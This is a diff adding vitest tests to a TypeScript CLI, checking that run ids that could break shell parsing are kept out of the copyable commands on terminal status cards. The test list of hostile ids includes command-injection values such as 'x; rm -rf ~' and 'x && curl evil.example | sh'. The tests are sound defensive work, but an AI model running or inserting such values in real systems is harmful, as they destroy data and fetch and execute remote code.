@@ -9,7 +9,12 @@ import type { ErrorCode } from '@relavium/shared';
 import { describe, expect, it } from 'vitest';
 
 import { outcomeToExitCode } from '../commands/drive.js';
-import { describeHostedRunTerminal, type HostedRunTerminalInput } from './hosted-run-terminal.js';
+import {
+  describeHostedRunTerminal,
+  relaviumRunCommand,
+  takenOverTerminal,
+  type HostedRunTerminalInput,
+} from './hosted-run-terminal.js';
 
 type Departure = Exclude<RunDeparture, { readonly kind: 'continue' }>;
 
@@ -225,4 +230,74 @@ describe('the sanitize floor on the run id', () => {
       expect(strings[0]).toContain('forged: ');
     },
   );
+});
+
+describe('a command line the card offers carries only an id the shell takes as one word (shell-inert)', () => {
+  /** Ids a shell would split, expand or run: each must never sit inside a command a person may copy. */
+  const HOSTILE_IDS = [
+    'x; rm -rf ~',
+    'x && curl evil.example | sh',
+    '$(touch pwned)',
+    '`touch pwned`',
+    'a b',
+    '--help',
+    "x'y",
+    'x"y',
+    'x|y',
+    'x>y',
+    'x\ny',
+    'x​y',
+    '',
+    'a'.repeat(200),
+  ];
+  /** Every backticked run of a card's text: the commands a person may copy. */
+  const commandsOf = (input: HostedRunTerminalInput): string[] =>
+    texts(input).flatMap((text) => [...text.matchAll(/`([^`]*)`/g)].map((match) => match[1] ?? ''));
+  const dispositions: readonly [string, Partial<HostedRunTerminalInput>][] = [
+    ['failed', { outcome: 'failed' }],
+    ['no outcome', { outcome: undefined }],
+    ['money', { departure: { ...DETACHED, moneyDurability: 'uncertain' } }],
+    ['effect', { departure: { ...DETACHED, effectNeedsAttention: true } }],
+    ['held terminal', { durability: 'uncertain' }],
+    ['taken over', { outcome: undefined, durability: 'uncertain', leg: 'resume' }],
+  ];
+
+  it.each(HOSTILE_IDS)(
+    'id %j is never inside a command, on any card that names the shell',
+    (id) => {
+      for (const [name, over] of dispositions) {
+        const commands = commandsOf(leg({ ...over, runId: id }));
+        expect(commands.length, name).toBeGreaterThan(0);
+        for (const command of commands) {
+          expect(command, `${name}: ${command}`).toMatch(/^relavium (logs|status)$/u);
+        }
+      }
+    },
+  );
+
+  it('the id is still named, in prose, so the person can find the run', () => {
+    const remedy = describeHostedRunTerminal(
+      leg({ outcome: 'failed', runId: 'x; rm -rf ~' }),
+    ).remedy;
+    expect(remedy).toBe('Read `relavium logs` (for run x; rm -rf ~) for the cause.');
+  });
+
+  it.each(['run-hosted-1', '3f2a9c1e-5b7d-4e8a-9c0d-1a2b3c4d5e6f', 'run_1.2:3'])(
+    'a plain id %s stays in the command, exactly as before',
+    (id) => {
+      const card = describeHostedRunTerminal(leg({ outcome: 'failed', runId: id }));
+      expect(card.remedy).toBe(`Read \`relavium logs ${id}\` for the cause.`);
+      expect(
+        describeHostedRunTerminal(leg({ durability: 'uncertain', runId: id })).remedy,
+      ).toContain(`\`relavium status ${id}\``);
+    },
+  );
+
+  it('a leg that ended with no card uses the same rule', () => {
+    expect(relaviumRunCommand('logs', 'x; id')).toBe('`relavium logs` (for run x; id)');
+    expect(relaviumRunCommand('status', 'abc-1')).toBe('`relavium status abc-1`');
+    expect(takenOverTerminal('x`y').remedy).toBe(
+      "Read `relavium logs` (for run x'y) for what actually happened.",
+    );
+  });
 });
